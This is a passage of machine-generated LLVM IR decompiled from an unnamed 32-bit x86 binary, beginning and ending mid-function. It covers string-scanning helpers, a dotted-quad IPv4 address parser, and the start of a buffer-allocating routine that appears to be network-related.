  %v0_80500d0 = phi i32 [ %v1_80500d0, %dec_label_pc_80500c7 ], [ %v0_80500bb.lcssa, %dec_label_pc_80500c3 ]
  %v10_80500d1 = icmp eq i32 %v0_80500d0, 0
  %v1_80500d4 = icmp eq i1 %v10_80500d1, false
  br i1 %v1_80500d4, label %dec_label_pc_80500c7, label %dec_label_pc_80500d6

dec_label_pc_80500d6:                             ; preds = %dec_label_pc_80500d0
  br label %dec_label_pc_80500d8

dec_label_pc_80500d8:                             ; preds = %dec_label_pc_8050045, %dec_label_pc_80500a3, %dec_label_pc_8050097, %dec_label_pc_805008b, %dec_label_pc_80500c7, %dec_label_pc_80500b7, %dec_label_pc_80500d6
  %v0_80500db = phi i32 [ %v1_8050072, %dec_label_pc_80500b7 ], [ 0, %dec_label_pc_80500d6 ], [ %v1_80500c7, %dec_label_pc_80500c7 ], [ %v1_80500a7, %dec_label_pc_80500a3 ], [ %v1_805009b, %dec_label_pc_8050097 ], [ %v1_805008f, %dec_label_pc_805008b ], [ %v1_8050045, %dec_label_pc_8050045 ]
  ret i32 %v0_80500db

; uselistorder directives
  uselistorder i32 %v0_80500d0, { 1, 0 }
  uselistorder i32 %v1_80500bb, { 0, 2, 1 }
  uselistorder i32 %v1_8050072, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805007251, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8050067, { 1, 0 }
  uselistorder i32 %v0_8050045, { 1, 0, 2 }
  uselistorder i32 %v2_8050041, { 1, 0 }
  uselistorder i32 %v4_8050031, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80500d8, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8050072, { 1, 0 }
  uselistorder label %dec_label_pc_805005b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050057, { 1, 0 }
}

define i32 @function_80500dc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80500dc:
  %eax.global-to-local = alloca i32, align 4
  %v4_80500df = ptrtoint i8* %arg1 to i32
  store i32 %v4_80500df, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80500eb = icmp eq i8* %arg1, null
  %v1_80500ed = icmp eq i1 %v1_80500eb, false
  br i1 %v1_80500ed, label %dec_label_pc_80500f1, label %dec_label_pc_80500ef

dec_label_pc_80500ef:                             ; preds = %dec_label_pc_80500dc
  %v1_80500ef = inttoptr i32 %arg3 to i32*
  %v2_80500ef = load i32, i32* %v1_80500ef, align 4
  store i32 %v2_80500ef, i32* @ebx, align 4
  br label %dec_label_pc_80500f1

dec_label_pc_80500f1:                             ; preds = %dec_label_pc_80500dc, %dec_label_pc_80500ef
  %v0_80500f4 = phi i32 [ %v4_80500df, %dec_label_pc_80500dc ], [ %v2_80500ef, %dec_label_pc_80500ef ]
  %v0_80500f1 = load i32, i32* @ecx, align 4
  %v5_80500f4 = inttoptr i32 %v0_80500f4 to i8*
  %v8_80500f5 = call i32 @function_8051068(i8* %v5_80500f4, i32 %arg2, i32 %v0_80500f1, i32 %v0_80500f1)
  store i32 %v8_80500f5, i32* %eax.global-to-local, align 4
  %v0_80500fd = load i32, i32* @ebx, align 4
  %v2_80500fd = add i32 %v0_80500fd, %v8_80500f5
  store i32 %v2_80500fd, i32* @ebx, align 4
  %v1_80500ff = inttoptr i32 %v2_80500fd to i8*
  %v2_80500ff = load i8, i8* %v1_80500ff, align 1
  %v3_80500ff = icmp eq i8 %v2_80500ff, 0
  %v1_8050102 = icmp eq i1 %v3_80500ff, false
  br i1 %v1_8050102, label %dec_label_pc_805010a, label %dec_label_pc_8050104

dec_label_pc_8050104:                             ; preds = %dec_label_pc_80500f1
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050106 = load i32, i32* @esi, align 4
  %v2_8050106 = inttoptr i32 %v1_8050106 to i32*
  store i32 %v2_80500fd, i32* %v2_8050106, align 4
  %v0_8050134.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050131

dec_label_pc_805010a:                             ; preds = %dec_label_pc_80500f1
  %v0_805010a = load i32, i32* @edx, align 4
  %v0_805010c = load i32, i32* @edi, align 4
  %v8_805010e = call i32 @function_8050138(i8* %v1_80500ff, i32 %v0_805010c, i32 %v0_805010a, i32 %v0_805010a)
  store i32 %v8_805010e, i32* %eax.global-to-local, align 4
  %v2_8050116 = icmp eq i32 %v8_805010e, 0
  %v1_8050118 = icmp eq i1 %v2_8050116, false
  br i1 %v1_8050118, label %dec_label_pc_8050129, label %dec_label_pc_805011a

dec_label_pc_805011a:                             ; preds = %dec_label_pc_805010a
  %v0_805011e = load i32, i32* @ebx, align 4
  %v5_805011e = inttoptr i32 %v0_805011e to i8*
  %v8_805011f = call i32 @function_8051004(i8* %v5_805011e, i32 0, i32 %v8_805010e, i32 %v8_805010e)
  br label %dec_label_pc_805012d

dec_label_pc_8050129:                             ; preds = %dec_label_pc_805010a
  %v9_805010e = inttoptr i32 %v8_805010e to i8*
  store i8 0, i8* %v9_805010e, align 1
  %v2_805012c = add i32 %v8_805010e, 1
  br label %dec_label_pc_805012d

dec_label_pc_805012d:                             ; preds = %dec_label_pc_805011a, %dec_label_pc_8050129
  %storemerge = phi i32 [ %v2_805012c, %dec_label_pc_8050129 ], [ %v8_805011f, %dec_label_pc_805011a ]
  %v0_805012d = phi i32 [ %v2_805012c, %dec_label_pc_8050129 ], [ %v8_805011f, %dec_label_pc_805011a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_805012d = load i32, i32* @esi, align 4
  %v2_805012d = inttoptr i32 %v1_805012d to i32*
  store i32 %v0_805012d, i32* %v2_805012d, align 4
  %v0_805012f = load i32, i32* @ebx, align 4
  store i32 %v0_805012f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050131

dec_label_pc_8050131:                             ; preds = %dec_label_pc_8050104, %dec_label_pc_805012d
  %v0_8050134 = phi i32 [ %v0_8050134.pre, %dec_label_pc_8050104 ], [ %v0_805012f, %dec_label_pc_805012d ]
  ret i32 %v0_8050134

; uselistorder directives
  uselistorder i32 %v8_805010e, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050131, { 1, 0 }
  uselistorder label %dec_label_pc_805012d, { 1, 0 }
  uselistorder label %dec_label_pc_80500f1, { 1, 0 }
}

define i32 @function_8050138(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050138:
  %v0_8050139 = load i32, i32* @ebx, align 4
  %v2_805015024 = load i8, i8* %arg1, align 1
  %v4_805015228 = icmp eq i8 %v2_805015024, 0
  br i1 %v4_805015228, label %dec_label_pc_805015a, label %dec_label_pc_8050156.lr.ph

dec_label_pc_8050156.lr.ph:                       ; preds = %dec_label_pc_8050138
  %v3_805015025 = zext i8 %v2_805015024 to i32
  %v5_805015026 = and i32 %v0_8050139, -256
  %v6_805015027 = or i32 %v3_805015025, %v5_805015026
  %v4_805013e = ptrtoint i8* %arg1 to i32
  %v1_805014913 = inttoptr i32 %arg2 to i8*
  %v4_8050149.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050156

dec_label_pc_8050144:                             ; preds = %dec_label_pc_8050156, %dec_label_pc_8050148
  %v6_805014922 = phi i32 [ %v6_8050149, %dec_label_pc_8050148 ], [ %v6_805014917, %dec_label_pc_8050156 ]
  %v2_805014921 = phi i8 [ %v2_8050149, %dec_label_pc_8050148 ], [ %v2_805014914, %dec_label_pc_8050156 ]
  %v0_805014820 = phi i32 [ %v1_8050148, %dec_label_pc_8050148 ], [ %arg2, %dec_label_pc_8050156 ]
  %v15_8050144 = icmp eq i8 %v2_805014921, %v2_805015031
  br i1 %v15_8050144, label %dec_label_pc_805015c, label %dec_label_pc_8050148

dec_label_pc_8050148:                             ; preds = %dec_label_pc_8050144
  %v1_8050148 = add i32 %v0_805014820, 1
  %v1_8050149 = inttoptr i32 %v1_8050148 to i8*
  %v2_8050149 = load i8, i8* %v1_8050149, align 1
  %v3_8050149 = zext i8 %v2_8050149 to i32
  %v5_8050149 = and i32 %v6_805014922, -256
  %v6_8050149 = or i32 %v3_8050149, %v5_8050149
  %v4_805014b = icmp eq i8 %v2_8050149, 0
  %v1_805014d = icmp eq i1 %v4_805014b, false
  br i1 %v1_805014d, label %dec_label_pc_8050144, label %dec_label_pc_805014f

dec_label_pc_805014f:                             ; preds = %dec_label_pc_8050148, %dec_label_pc_8050156
  %v4_8050149.pre34 = phi i32 [ %v6_805014917, %dec_label_pc_8050156 ], [ %v6_8050149, %dec_label_pc_8050148 ]
  %v1_805014f = add i32 %v0_805014f29, 1
  %v1_8050150 = inttoptr i32 %v1_805014f to i8*
  %v2_8050150 = load i8, i8* %v1_8050150, align 1
  %v3_8050150 = zext i8 %v2_8050150 to i32
  %v5_8050150 = and i32 %v6_805015032, -256
  %v6_8050150 = or i32 %v3_8050150, %v5_8050150
  %v4_8050152 = icmp eq i8 %v2_8050150, 0
  br i1 %v4_8050152, label %dec_label_pc_805015a, label %dec_label_pc_8050156

dec_label_pc_8050156:                             ; preds = %dec_label_pc_8050156.lr.ph, %dec_label_pc_805014f
  %v4_8050149.pre = phi i32 [ %v4_8050149.pre.pre, %dec_label_pc_8050156.lr.ph ], [ %v4_8050149.pre34, %dec_label_pc_805014f ]
  %v6_805015032 = phi i32 [ %v6_805015027, %dec_label_pc_8050156.lr.ph ], [ %v6_8050150, %dec_label_pc_805014f ]
  %v2_805015031 = phi i8 [ %v2_805015024, %dec_label_pc_8050156.lr.ph ], [ %v2_8050150, %dec_label_pc_805014f ]
  %v0_805014f29 = phi i32 [ %v4_805013e, %dec_label_pc_8050156.lr.ph ], [ %v1_805014f, %dec_label_pc_805014f ]
  %v2_805014914 = load i8, i8* %v1_805014913, align 1
  %v3_805014915 = zext i8 %v2_805014914 to i32
  %v5_805014916 = and i32 %v4_8050149.pre, -256
  %v6_805014917 = or i32 %v3_805014915, %v5_805014916
  %v4_805014b18 = icmp eq i8 %v2_805014914, 0
  %v1_805014d19 = icmp eq i1 %v4_805014b18, false
  br i1 %v1_805014d19, label %dec_label_pc_8050144, label %dec_label_pc_805014f

dec_label_pc_805015a:                             ; preds = %dec_label_pc_805014f, %dec_label_pc_8050138
  br label %dec_label_pc_805015c

dec_label_pc_805015c:                             ; preds = %dec_label_pc_8050144, %dec_label_pc_805015a
  %v0_805015e = phi i32 [ 0, %dec_label_pc_805015a ], [ %v0_805014f29, %dec_label_pc_8050144 ]
  store i32 %v0_8050139, i32* @ebx, align 4
  ret i32 %v0_805015e

; uselistorder directives
  uselistorder i8 %v2_805014914, { 1, 2, 0 }
  uselistorder i32 %v1_805014f, { 1, 0 }
  uselistorder i32 %v6_8050149, { 1, 0 }
  uselistorder i8 %v2_8050149, { 1, 2, 0 }
  uselistorder i32 %v1_8050148, { 1, 0 }
  uselistorder i8 %v2_805015024, { 0, 2, 1 }
  uselistorder i32 %v0_8050139, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805015c, { 1, 0 }
  uselistorder label %dec_label_pc_8050156, { 1, 0 }
  uselistorder label %dec_label_pc_805014f, { 1, 0 }
}

define i32 @function_8050160(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050160:
  %v4_8050167 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050167, i32* @ecx, align 4
  %v1_805016b = icmp eq i8* %arg1, null
  br i1 %v1_805016b, label %dec_label_pc_80501ec, label %dec_label_pc_805016f

dec_label_pc_805016f:                             ; preds = %dec_label_pc_8050160
  %v0_805017d.pre = load i32, i32* @global_var_80559e0, align 32
  br label %dec_label_pc_805017a

dec_label_pc_805017a:                             ; preds = %dec_label_pc_805016f, %dec_label_pc_80501c3
  %v2_80501c635 = phi i32 [ 1, %dec_label_pc_805016f ], [ %v3_80501c6, %dec_label_pc_80501c3 ]
  %v0_805017a34 = phi i32 [ %v4_8050167, %dec_label_pc_805016f ], [ %v0_805017a3, %dec_label_pc_80501c3 ]
  %v0_80501e133 = phi i32 [ 0, %dec_label_pc_805016f ], [ %v2_80501c9, %dec_label_pc_80501c3 ]
  %v1_805017a = inttoptr i32 %v0_805017a34 to i8*
  %v2_805017a = load i8, i8* %v1_805017a, align 1
  %v3_805017a = sext i8 %v2_805017a to i32
  %v2_8050183 = mul nsw i32 %v3_805017a, 2
  %v3_8050183 = add i32 %v2_8050183, %v0_805017d.pre
  %v4_8050183 = inttoptr i32 %v3_8050183 to i8*
  %v5_8050183 = load i8, i8* %v4_8050183, align 1
  %v6_8050183 = and i8 %v5_8050183, 8
  %v7_8050183 = icmp eq i8 %v6_8050183, 0
  br i1 %v7_8050183, label %dec_label_pc_80501ec, label %dec_label_pc_805018a

dec_label_pc_805018a:                             ; preds = %dec_label_pc_805017a
  %v4_805019e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805019e

dec_label_pc_805018e:                             ; preds = %dec_label_pc_805019e
  %v3_805018e = mul i32 %v1_805018e, 10
  %v2_8050191 = add i32 %v3_805018e, -48
  %v3_8050191 = add i32 %v2_8050191, %v2_80501a0
  %v1_8050195 = add i32 %v3_8050191, -255
  %v6_8050195 = sub i32 254, %v3_8050191
  %v7_8050195 = and i32 %v6_8050195, %v3_8050191
  %v8_8050195 = icmp slt i32 %v7_8050195, 0
  %v9_8050195 = icmp eq i32 %v1_8050195, 0
  %v10_8050195 = icmp slt i32 %v1_8050195, 0
  %v3_805019b = icmp eq i1 %v10_8050195, %v8_8050195
  %v4_805019b = icmp eq i1 %v9_8050195, false
  %v5_805019b = and i1 %v4_805019b, %v3_805019b
  br i1 %v5_805019b, label %dec_label_pc_80501ec, label %dec_label_pc_805019d

dec_label_pc_805019d:                             ; preds = %dec_label_pc_805018e
  %v1_805019d = add i32 %v0_805019d, 1
  store i32 %v1_805019d, i32* @ecx, align 4
  br label %dec_label_pc_805019e

dec_label_pc_805019e:                             ; preds = %dec_label_pc_805018a, %dec_label_pc_805019d
  %v1_805018e = phi i32 [ 0, %dec_label_pc_805018a ], [ %v3_8050191, %dec_label_pc_805019d ]
  %v4_805019e = phi i32 [ %v4_805019e.pre, %dec_label_pc_805018a ], [ %v6_805019e, %dec_label_pc_805019d ]
  %v0_805019d = phi i32 [ %v0_805017a34, %dec_label_pc_805018a ], [ %v1_805019d, %dec_label_pc_805019d ]
  %v1_805019e = inttoptr i32 %v0_805019d to i8*
  %v2_805019e = load i8, i8* %v1_805019e, align 1
  %v3_805019e = zext i8 %v2_805019e to i32
  %v5_805019e = and i32 %v4_805019e, -256
  %v6_805019e = or i32 %v3_805019e, %v5_805019e
  store i32 %v6_805019e, i32* @edx, align 4
  %v2_80501a0 = sext i8 %v2_805019e to i32
  %v2_80501a3 = mul nsw i32 %v2_80501a0, 2
  %v3_80501a3 = add i32 %v2_80501a3, %v0_805017d.pre
  %v4_80501a3 = inttoptr i32 %v3_80501a3 to i16*
  %v5_80501a3 = load i16, i16* %v4_80501a3, align 2
  %v2_80501a8 = and i16 %v5_80501a3, 8
  %v3_80501a8 = icmp eq i16 %v2_80501a8, 0
  %v1_80501aa = icmp eq i1 %v3_80501a8, false
  br i1 %v1_80501aa, label %dec_label_pc_805018e, label %dec_label_pc_80501ac

dec_label_pc_80501ac:                             ; preds = %dec_label_pc_805019e
  %v8_80501ac = sub nsw i32 2, %v2_80501c635
  %v9_80501ac = and i32 %v8_80501ac, %v2_80501c635
  %v10_80501ac = icmp slt i32 %v9_80501ac, 0
  %v11_80501ac = icmp eq i32 %v2_80501c635, 3
  %v12_80501ac = icmp slt i32 %v2_80501c635, 3
  %v3_80501b0 = icmp eq i1 %v12_80501ac, %v10_80501ac
  %v4_80501b0 = icmp eq i1 %v11_80501ac, false
  %v5_80501b0 = and i1 %v4_80501b0, %v3_80501b0
  br i1 %v5_80501b0, label %dec_label_pc_80501ba, label %dec_label_pc_80501b2

dec_label_pc_80501b2:                             ; preds = %dec_label_pc_80501ac
  %v10_80501b2 = icmp eq i8 %v2_805019e, 46
  %v1_80501b5 = icmp eq i1 %v10_80501b2, false
  br i1 %v1_80501b5, label %dec_label_pc_80501ec, label %dec_label_pc_80501b7

dec_label_pc_80501b7:                             ; preds = %dec_label_pc_80501b2
  %v1_80501b7 = add i32 %v0_805019d, 1
  store i32 %v1_80501b7, i32* @ecx, align 4
  br label %dec_label_pc_80501c3

dec_label_pc_80501ba:                             ; preds = %dec_label_pc_80501ac
  %v1_80501ba = add i32 %v0_805019d, 1
  store i32 %v1_80501ba, i32* @ecx, align 4
  %v4_80501bb = icmp eq i8 %v2_805019e, 0
  br i1 %v4_80501bb, label %dec_label_pc_80501c3, label %dec_label_pc_80501bf

dec_label_pc_80501bf:                             ; preds = %dec_label_pc_80501ba
  %v2_80501bf = and i16 %v5_80501a3, 32
  %v3_80501bf = icmp eq i16 %v2_80501bf, 0
  br i1 %v3_80501bf, label %dec_label_pc_80501ec, label %dec_label_pc_80501c3

dec_label_pc_80501c3:                             ; preds = %dec_label_pc_80501bf, %dec_label_pc_80501ba, %dec_label_pc_80501b7
  %v0_805017a3 = phi i32 [ %v1_80501ba, %dec_label_pc_80501bf ], [ %v1_80501ba, %dec_label_pc_80501ba ], [ %v1_80501b7, %dec_label_pc_80501b7 ]
  %v2_80501c3 = mul i32 %v0_80501e133, 256
  %v3_80501c6 = add nuw nsw i32 %v2_80501c635, 1
  %v2_80501c9 = or i32 %v1_805018e, %v2_80501c3
  %v7_80501cf = icmp sgt i32 %v2_80501c635, 3
  br i1 %v7_80501cf, label %dec_label_pc_80501d1, label %dec_label_pc_805017a

dec_label_pc_80501d1:                             ; preds = %dec_label_pc_80501c3
  %v4_80501d6 = icmp eq i32 %arg2, 0
  br i1 %v4_80501d6, label %dec_label_pc_80501ee, label %dec_label_pc_80501dd

dec_label_pc_80501dd:                             ; preds = %dec_label_pc_80501d1
  %v1_80501e1 = call i32 @llvm.bswap.i32(i32 %v2_80501c9)
  %v2_80501e3 = inttoptr i32 %arg2 to i32*
  store i32 %v1_80501e1, i32* %v2_80501e3, align 4
  br label %dec_label_pc_80501ee

dec_label_pc_80501ec:                             ; preds = %dec_label_pc_80501bf, %dec_label_pc_80501b2, %dec_label_pc_805017a, %dec_label_pc_805018e, %dec_label_pc_8050160
  br label %dec_label_pc_80501ee

dec_label_pc_80501ee:                             ; preds = %dec_label_pc_80501d1, %dec_label_pc_80501dd, %dec_label_pc_80501ec
  %v0_80501f3 = phi i32 [ 1, %dec_label_pc_80501d1 ], [ 1, %dec_label_pc_80501dd ], [ 0, %dec_label_pc_80501ec ]
  ret i32 %v0_80501f3

; uselistorder directives
  uselistorder i32 %v2_80501a0, { 1, 0 }
  uselistorder i32 %v6_805019e, { 1, 0 }
  uselistorder i8 %v2_805019e, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805019d, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8050195, { 1, 0 }
  uselistorder i32 %v3_8050191, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805017a34, { 1, 0 }
  uselistorder i32 %v2_80501c635, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80501ee, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80501ec, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805019e, { 1, 0 }
  uselistorder label %dec_label_pc_805017a, { 1, 0 }
}

define i32 @function_80501f4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_80501f4:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 512, i32* %stack_var_-252, align 4
  %v1_805020a = call i32 @function_804d73a(i32 512)
  store i32 %v1_805020a, i32* %eax.global-to-local, align 4
  store i32 1025, i32* %stack_var_-252, align 4
  store i32 %v1_805020a, i32* @ebp, align 4
  %v1_8050218 = call i32 @function_804d73a(i32 1025)
  store i32 %v1_8050218, i32* %eax.global-to-local, align 4
  %v12_8050221 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8050224 = icmp eq i32 %v1_805020a, 0
  br i1 %v1_8050224, label %dec_label_pc_805089d, label %dec_label_pc_805022c

dec_label_pc_805022c:                             ; preds = %dec_label_pc_80501f4
  %v1_805022c = icmp eq i32 %v1_8050218, 0
  br i1 %v1_805022c, label %dec_label_pc_805089d, label %dec_label_pc_8050234

dec_label_pc_8050234:                             ; preds = %dec_label_pc_805022c
  %v5_8050234 = icmp eq i32 %arg2, 0
  br i1 %v5_8050234, label %dec_label_pc_805089d, label %dec_label_pc_8050242

dec_label_pc_8050242:                             ; preds = %dec_label_pc_8050234
  %v4_8050242 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050242, i32* %eax.global-to-local, align 4
  %v2_8050249 = load i8, i8* %arg1, align 1
  %v3_8050249 = icmp eq i8 %v2_8050249, 0
  br i1 %v3_8050249, label %dec_label_pc_805089d, label %dec_label_pc_8050252

dec_label_pc_8050252:                             ; preds = %dec_label_pc_8050242
  store i32 %v4_8050242, i32* %stack_var_-252, align 4
  %v2_8050256 = call i32 @function_804ce94(i8* nonnull %arg1)
  store i32 %v2_8050256, i32* @eax, align 4
  store i32 %v4_8050242, i32* %edx.global-to-local, align 4
  %v2_8050279 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8050279, i32* @ebx, align 4
  store i32 %v2_8050279, i32* %stack_var_-252, align 4
  %v2_8050281 = call i32 @function_804ec6e(i32 %v2_8050279, i32 134540395)
  store i32 %v2_8050281, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80580c8.194 to i32), i32* %stack_var_-252, align 4
  %v1_805028d = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80580c8.194 to i32))
  %v0_8050292 = load i64, i64* @global_var_80580e0.195, align 8
  %v1_8050292 = trunc i64 %v0_8050292 to i32
  %v1_8050297 = ashr i32 %v1_8050292, 31
  %v6_8050298 = and i64 %v0_8050292, 4294967295
  %v8_8050298 = zext i32 %v1_8050297 to i64
  %v9_8050298 = mul nuw i64 %v8_8050298, 4294967296
  %v10_8050298 = or i64 %v9_8050298, %v6_8050298
  %v14_8050298 = srem i64 %v10_8050298, %tmp33
  %v15_8050298 = trunc i64 %v14_8050298 to i32
  %v0_805029f = load i16, i16* @global_var_80559ec.196, align 4
  %v2_80502ae = load i32, i32* %stack_var_-252, align 4
  store i32 %v2_80502ae, i32* @eax, align 4
  store i32 134540395, i32* %edx.global-to-local, align 4
  store i32 %v2_8050279, i32* %stack_var_-252, align 4
  %v2_80502b3 = call i32 @function_804ec6e(i32 %v2_8050279, i32 1)
  store i32 %v2_80502b3, i32* %eax.global-to-local, align 4
  %v3_80502f7 = sext i16 %v0_805029f to i32
  %v5_805045a = inttoptr i32 %v15_8050298 to i8*
  %v1_805087886 = add i32 %v12_8050221, 28
  %v2_805087887 = inttoptr i32 %v1_805087886 to i32*
  %v3_805087888 = load i32, i32* %v2_805087887, align 4
  %tmp118 = icmp ult i32 %v3_805087888, 3
  br i1 %tmp118, label %dec_label_pc_80502d8, label %dec_label_pc_805089d

dec_label_pc_80502d8:                             ; preds = %dec_label_pc_8050252, %dec_label_pc_8050878.backedge
  %v0_80502df91 = phi i32 [ %v0_8050878.pre, %dec_label_pc_8050878.backedge ], [ %v12_8050221, %dec_label_pc_8050252 ]
  %v1_80502d8 = add i32 %v0_80502df91, 20
  %v2_80502d8 = inttoptr i32 %v1_80502d8 to i32*
  %v3_80502d8 = load i32, i32* %v2_80502d8, align 4
  %v13_80502d8 = icmp eq i32 %v3_80502d8, -1
  br i1 %v13_80502d8, label %dec_label_pc_80502d8.dec_label_pc_80502ee_crit_edge, label %dec_label_pc_80502df

dec_label_pc_80502d8.dec_label_pc_80502ee_crit_edge: ; preds = %dec_label_pc_80502d8
  %v0_80502ee.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80502ee

dec_label_pc_80502df:                             ; preds = %dec_label_pc_80502d8
  %v3_80502e2 = load i32, i32* %v2_80502d8, align 4
  %v5_80502e2 = add i32 %v0_80502df91, -16
  %v6_80502e2 = inttoptr i32 %v5_80502e2 to i32*
  store i32 %v3_80502e2, i32* %v6_80502e2, align 4
  %v1_80502e6 = call i32 @function_804b2bc(i32 -1)
  store i32 %v1_80502e6, i32* %eax.global-to-local, align 4
  %v0_80502eb = load i32, i32* @esp, align 4
  %v1_80502eb = add i32 %v0_80502eb, 16
  br label %dec_label_pc_80502ee

dec_label_pc_80502ee:                             ; preds = %dec_label_pc_80502d8.dec_label_pc_80502ee_crit_edge, %dec_label_pc_80502df
  %v1_80502ee = phi i32 [ %v0_80502df91, %dec_label_pc_80502d8.dec_label_pc_80502ee_crit_edge ], [ %v1_80502eb, %dec_label_pc_80502df ]
  %v0_80502ee = phi i32 [ %v0_80502ee.pre, %dec_label_pc_80502d8.dec_label_pc_80502ee_crit_edge ], [ %v1_80502e6, %dec_label_pc_80502df ]
  %v2_80502ee = add i32 %v1_80502ee, -4
  %v3_80502ee = inttoptr i32 %v2_80502ee to i32*
  store i32 %v0_80502ee, i32* %v3_80502ee, align 4
  %v1_80502ef = add i32 %v1_80502ee, -8
  %v2_80502ef = inttoptr i32 %v1_80502ef to i32*
  store i32 512, i32* %v2_80502ef, align 4
  %v1_80502f4 = add i32 %v1_80502ee, -12
  %v2_80502f4 = inttoptr i32 %v1_80502f4 to i32*
  store i32 0, i32* %v2_80502f4, align 4
  %v2_80502f6 = add i32 %v1_80502ee, -16
  %v3_80502f6 = inttoptr i32 %v2_80502f6 to i32*
  store i32 %v1_805020a, i32* %v3_80502f6, align 4
  %v5_80502f7 = call i32 @function_804ce60(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050298, i32 %v3_80502f7)
  store i32 %v5_80502f7, i32* %eax.global-to-local, align 4
  %v0_80502fc = load i32, i32* @esp, align 4
  %v1_80502ff = add i32 %v0_80502fc, 8
  %v2_80502ff = inttoptr i32 %v1_80502ff to i32*
  store i32 48, i32* %v2_80502ff, align 4
  %v1_8050301 = add i32 %v0_80502fc, 4
  %v2_8050301 = inttoptr i32 %v1_8050301 to i32*
  store i32 0, i32* %v2_8050301, align 4
  %v1_8050303 = add i32 %v0_80502fc, 84
  store i32 %v1_8050303, i32* @ebx, align 4
  %v3_8050307 = inttoptr i32 %v0_80502fc to i32*
  store i32 %v1_8050303, i32* %v3_8050307, align 4
  %v5_8050308 = call i32 @function_804ce60(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050298, i32 %v3_80502f7)
  store i32 %v5_8050308, i32* %eax.global-to-local, align 4
  %v0_805030d = load i32, i32* @esp, align 4
  %v1_805030d = add i32 %v0_805030d, 60
  %v2_805030d = inttoptr i32 %v1_805030d to i32*
  %v3_805030d = load i32, i32* %v2_805030d, align 4
  store i32 %v3_805030d, i32* %eax.global-to-local, align 4
  %v1_8050311 = add i32 %v0_805030d, 116
  %v2_8050311 = inttoptr i32 %v1_8050311 to i32*
  store i32 1, i32* %v2_8050311, align 4
  %v0_8050319 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050319 = add i32 %v0_8050319, 1
  %v0_805031a = load i32, i32* @esp, align 4
  %v1_805031a = add i32 %v0_805031a, 104
  %v2_805031a = inttoptr i32 %v1_805031a to i32*
  store i32 1, i32* %v2_805031a, align 4
  %v1_8050322 = urem i32 %v1_8050319, 65536
  store i32 %v1_8050322, i32* %eax.global-to-local, align 4
  %v1_8050327 = load i32, i32* @esp, align 4
  %v2_8050327 = add i32 %v1_8050327, 60
  %v3_8050327 = inttoptr i32 %v2_8050327 to i32*
  store i32 %v1_8050322, i32* %v3_8050327, align 4
  %v0_805032b = load i32, i32* %eax.global-to-local, align 4
  %v1_805032b = load i32, i32* @esp, align 4
  %v2_805032b = add i32 %v1_805032b, 84
  %v3_805032b = inttoptr i32 %v2_805032b to i32*
  store i32 %v0_805032b, i32* %v3_805032b, align 4
  %v0_805032f = load i32, i32* @esp, align 4
  %v1_8050332 = add i32 %v0_805032f, 8
  %v2_8050332 = inttoptr i32 %v1_8050332 to i32*
  store i32 512, i32* %v2_8050332, align 4
  %v2_8050337 = add i32 %v0_805032f, 4
  %v3_8050337 = inttoptr i32 %v2_8050337 to i32*
  store i32 %v1_805020a, i32* %v3_8050337, align 4
  %v0_8050338 = load i32, i32* @ebx, align 4
  %v3_8050338 = inttoptr i32 %v0_805032f to i32*
  store i32 %v0_8050338, i32* %v3_8050338, align 4
  %v0_8050339 = call i32 @function_80515c4()
  store i32 %v0_8050339, i32* %eax.global-to-local, align 4
  %v0_805033e = load i32, i32* @esp, align 4
  store i32 %v0_8050339, i32* @ebx, align 4
  %v2_8050343 = icmp slt i32 %v0_8050339, 0
  br i1 %v2_8050343, label %dec_label_pc_805089d, label %dec_label_pc_805034b

dec_label_pc_805034b:                             ; preds = %dec_label_pc_80502ee
  %v2_805034b = add i32 %v0_805033e, 12
